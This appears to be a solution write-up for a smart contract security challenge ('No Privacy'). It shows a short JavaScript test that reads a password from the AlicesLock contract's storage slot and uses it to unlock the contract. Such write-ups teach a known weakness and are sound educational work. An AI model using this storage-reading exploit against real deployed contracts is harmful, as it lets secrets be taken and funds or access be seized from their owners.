# Smart Contract Security Challenge
---
## Challenge 1

### No Privacy

To exploit the AlicesLock contract, you can follow these steps in the no-privacy.js test file:

#### *Steps to Exploit*

- Access Contract Storage: The password is stored in the contract's storage, so you can read it directly.

- Unlock the Contract: Use the unlock function with the password obtained from storage.

#### *Exploit Code*
Here's how you can write the exploit in the Exploit section:

```javascript
it("Exploit", async function () {
    // Get the storage slot for the password
    const passwordSlot = await ethers.provider.getStorageAt(this.lock.address, 1);

    // Unlock the contract using the password from storage
    await this.lock.connect(bob).unlock(passwordSlot);
});
```

#### *Explanation*
- `ethers.provider.getStorageAt(this.lock.address, 1)`: This reads the password from the second storage slot (index 1) of the AlicesLock contract.

- `this.lock.connect(bob).unlock(passwordSlot)`: Bob uses the retrieved password to call the unlock function.

